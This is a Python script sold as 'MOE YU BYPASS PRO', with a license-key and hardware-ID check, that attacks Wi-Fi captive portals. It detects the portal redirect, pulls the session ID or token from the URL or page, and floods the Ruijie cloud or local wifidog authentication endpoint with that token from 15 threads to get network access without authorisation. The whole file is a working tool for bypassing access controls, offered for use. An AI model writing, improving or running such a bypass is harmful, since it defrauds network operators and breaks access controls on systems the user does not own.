import requests, re, urllib3, time, threading, sys, datetime, os, uuid, socket
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
PING_THREADS = 15

# COLOR SYSTEM
RED, GREEN, CYAN, YELLOW, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[0m"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]"""

# ===============================
# LICENSE & HWID SYSTEM
# ===============================
def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-998A7F92-675"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def get_current_gateway():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        gw = ".".join(s.getsockname()[0].split('.')[:-1]) + ".1"
        s.close()
        return gw
    except: return "192.168.61.1"

def check_license():
    my_hwid = get_hwid()
    os.system('clear')
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[red]DEVICE INFO[/red]", border_style="cyan", expand=False)))
    
    user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    if not user_key: sys.exit()
    
    try:
        res = requests.get(URL, timeout=10)
        for entry in res.text.splitlines():
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    print(f"{RED}❌ HWID MISMATCH!{RESET}")
                    sys.exit()
                
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                if is_active:
                    console.print(f"\n[bold green]>>> AUTHENTICATION SUCCESS[/bold green]")
                    console.print(Align.center(f"[bold yellow]EXPIRY: {date_label}[/bold yellow]\n"))
                    return True
        print(f"{RED}❌ INVALID KEY!{RESET}")
        sys.exit()
    except:
        print(f"{RED}📡 CONNECTION ERROR!{RESET}")
        sys.exit()

# ===============================
# BYPASS ENGINE
# ===============================
def start_bypass():
    while True:
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            
            # ၁။ Redirect ရှာခြင်း
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            if r.status_code == 204:
                time.sleep(5)
                continue
            
            portal_url = r.url
            r1 = session.get(portal_url, timeout=10, verify=False)
            
            # ၂။ SID Extraction (URL ရော Page ထဲကပါ ရှာမည်)
            params = parse_qs(urlparse(portal_url).query)
            sid = (params.get('sessionId') or params.get('token') or [None])[0]
            
            if not sid:
                sid_match = re.search(r'(?:sessionId|token)=([a-zA-Z0-9_\-]{15,})', r1.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၃။ Cloud သို့မဟုတ် Local ခွဲခြားခြင်း
                if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                    mode = "CLOUD-FIX"
                else:
                    gw = get_current_gateway()
                    auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
                    mode = "LOCAL-FIX"

                # ၄။ Turbo Injector (အမှန်ခြစ်လေးများ ပေါ်မည့်နေရာ)
                def pulse():
                    while True:
                        try:
                            session.get(auth_link, timeout=10, verify=False)
                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:12]}... | Status: ACTIVE{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.1)

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse, daemon=True).start()
                
                # အင်တာနက် အခြေအနေ စောင့်ကြည့်ခြင်း
                while session.get("http://www.google.com", timeout=5).status_code == 200:
                    time.sleep(15)
            else:
                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. PLEASE OPEN BROWSER LOGIN PAGE!{RESET}\n")
                time.sleep(5)
        except: time.sleep(5)

if __name__ == "__main__":
    if check_license():
        console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v8.5 ACTIVATED 🔥[/bold red]", border_style="white"))
        try: start_bypass()
        except KeyboardInterrupt: sys.exit()
